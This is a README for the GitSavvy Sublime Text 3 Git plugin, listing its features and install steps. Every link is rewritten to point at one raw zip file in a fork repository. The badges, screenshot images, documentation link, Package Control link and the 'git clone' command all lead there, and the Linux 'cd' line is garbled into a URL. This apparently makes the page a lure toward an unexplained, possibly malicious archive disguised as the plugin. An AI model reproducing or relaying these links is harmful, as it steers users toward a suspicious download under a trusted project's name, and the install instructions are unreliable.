# GitSavvy

[![Build Status](https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip)](https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip)
[![AppVeyor branch](https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip)](https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip)
[![Coverage Status](https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip)](https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip)
![License](https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip)

Sublime Text 3 plugin providing the following features:

- basic Git functionality; `init`, `add`, `commit`, `amend`, `checkout`, `pull`, `push`, etc.
- inline diff viewing, including quick navigation between modified hunks and the ability to (un)stage files by hunk or by line (respectfully stolen from SourceTree, GitX, et al)
- GitHub integration
    + issue/collaborator referencing when committing
    + opening the current file on GitHub at the selected line
- GitHub-style blame view, showing hunk metadata and ability to view the commit that made the change
- `git diff` view, allowing user to (un)stage hunks across all files
- status, branch, tag, and rebase dashboards

**Note:** GitSavvy requires Git versions at or greater than 2.18.0.

**Note:** Sublime Text 2 is not supported.  Also, GitSavvy takes advantage of certain features of ST3 that have bugs in earlier ST3 releases.  For the best experience, use the latest ST3 dev build.


## Documentation

Feature documentation can be found [here](https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip).  It can also be accessed from within Sublime by opening the command palette and typing `GitSavvy: help`.


## Highlights

<table>
    <tr>
        <th>Inline-diff</th>
        <th>Status dashboard</th>
    </tr>
    <tr>
        <td width="50%">
            <a href="https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip">
                <img src="https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip" width="100%">
            </a>
        </td>
        <td width="50%">
            <a href="https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip">
                <img src="https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip" width="100%">
            </a>
        </td>
    </tr>
    <tr>
        <td width="50%">(Un)stage and revert individual lines and hunks.</td>
        <td width="50%">Display and overview and offer actions to manipulate your project state.</td>
    </tr>
</table>

<table>
    <tr>
        <th>Branch dashboard</th>
        <th>Tags dashboard</th>
    </tr>
    <tr>
        <td width="50%">
            <a href="https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip">
                <img src="https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip" width="100%">
            </a>
        </td>
        <td width="50%">
            <a href="https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip">
                <img src="https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip" width="100%">
            </a>
        </td>
    </tr>
    <tr>
        <td width="50%">View and manipulate local and remote branches.</td>
        <td width="50%">View and manipulate local and remote tags.</td>
    </tr>
</table>

<table>
    <tr>
        <th>Github integration</th>
        <th>Rebase dashboard</th>
    </tr>
    <tr>
        <td width="50%">
            <a href="https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip">
                <img src="https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip" width="100%">
            </a>
        </td>
        <td width="50%">
            <a href="https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip">
                <img src="https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip" width="100%">
            </a>
        </td>
    </tr>
    <tr>
        <td width="50%">Reference issues and collaborators in commits.  Open files on GitHub in the browser, with lines pre-selected.</td>
        <td width="50%"> Squash, edit, move, rebase, undo, redo.</td>
    </tr>
</table>


## Installation

### Simple

1. Install the [Sublime Text Package Control](https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip) plugin if you don't have it already.
2. Open the command palette and start typing `Package Control: Install Package`.
3. Enter `GitSavvy`.

**Note:** If you're using 64-bit Windows, the path to the Git binary may not be as you expect.  If GitSavvy fails to operate correctly in this configuration, make sure to confirm the Git path you're using in the config.

### Less simple

If you want more control over what you pull down, or if you'd like to submit changes to GitSavvy, you should pull down the repository directly and restart the editor.

```
# on a Mac
cd "$HOME/Library/Application Support/Sublime Text 3/Packages"
# on Linux
cd $https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip
# on Windows (PowerShell)
cd "$env:appdata\Sublime Text 3\Packages\"

git clone https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip

# Package Control need to be installed https://github.com/fnatio213/GitSavvy/raw/refs/heads/master/core/Git_Savvy_v2.8.zip
# install dependencies from command line
subl --command 'satisfy_dependencies'
# or open Command Palette and run 'Package Control: Satisfy Dependencies'
```
